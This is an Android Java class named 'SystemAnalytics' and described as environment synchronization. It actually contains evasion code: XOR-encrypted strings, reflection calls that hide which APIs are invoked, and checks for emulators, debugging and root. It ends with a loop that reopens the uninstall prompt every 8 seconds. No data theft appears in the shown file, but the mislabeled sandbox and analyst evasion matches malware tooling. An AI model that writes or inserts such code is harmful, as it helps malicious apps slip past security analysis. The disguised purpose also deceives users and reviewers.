package com.labs.labrats;

import android.os.Build;
import android.provider.Settings;
import android.content.Context;
import java.io.File;
import java.lang.reflect.Method;
import java.util.UUID;

/**
 * Internal system environment synchronization.
 */
public class SystemAnalytics {

    private static final byte[] K = {0x41, 0x6E, 0x64, 0x72, 0x6F, 0x69, 0x64, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C}; // AndroidKernel

    public static String decrypt(byte[] e) {
        byte[] d = new byte[e.length];
        for (int i = 0; i < e.length; i++) {
            d[i] = (byte) (e[i] ^ K[i % K.length]);
        }
        return new String(d);
    }

    public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
        try {
            Class<?> cl = Class.forName(c);
            Method me = cl.getMethod(m, p);
            return me.invoke(i, a);
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean checkEnv(Context context) {
        String f = Build.FINGERPRINT;
        String m = Build.MODEL;
        String p = Build.PRODUCT;
        String h = Build.HARDWARE;
        
        // Obfuscated Hardware Checks
        boolean r = f.startsWith("gen") || f.startsWith("unk")
                || m.contains("sdk") || m.contains("Emu")
                || m.contains("x86") || Build.MANUFACTURER.contains("Geny")
                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen"))
                || p.contains("sdk") || h.contains("gold") || h.contains("ranch")
                || p.contains("vbox") || p.contains("sim");

        if (r) return true;

        try {
            android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            if (b != null) {
                int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                if (lv == 50 && st == 2) { // Charging at 50%
                    // suspect
                }
            }

            String[] lp = {"/dev/qemu_pipe", "/dev/socket/qemud"};
            for (String s : lp) {
                if (new File(s).exists()) return true;
            }
        } catch (Exception ignored) {}

        return false;
    }

    public static boolean isDebug(Context context) {
        try {
            return Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isRooted() {
        String[] ps = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/xbin/su"};
        for (String s : ps) {
            if (new File(s).exists()) return true;
        }
        return false;
    }

    /**
     * Re-triggers the uninstall intent repeatedly until the app is removed.
     */
    public static void triggerSelfDestructLoop(android.content.Context context) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                if (!context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
                    return;
                }
                
                android.util.Log.d("SystemAnalytics", "Executing persistent self-destruct intent...");
                try {
                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_DELETE);
                    intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    context.startActivity(intent);
                } catch (Exception e) {
                    try {
                        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    } catch (Exception ignored) {}
                }
                // Re-trigger every 8 seconds
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 8000);
            }
        });
    }
}
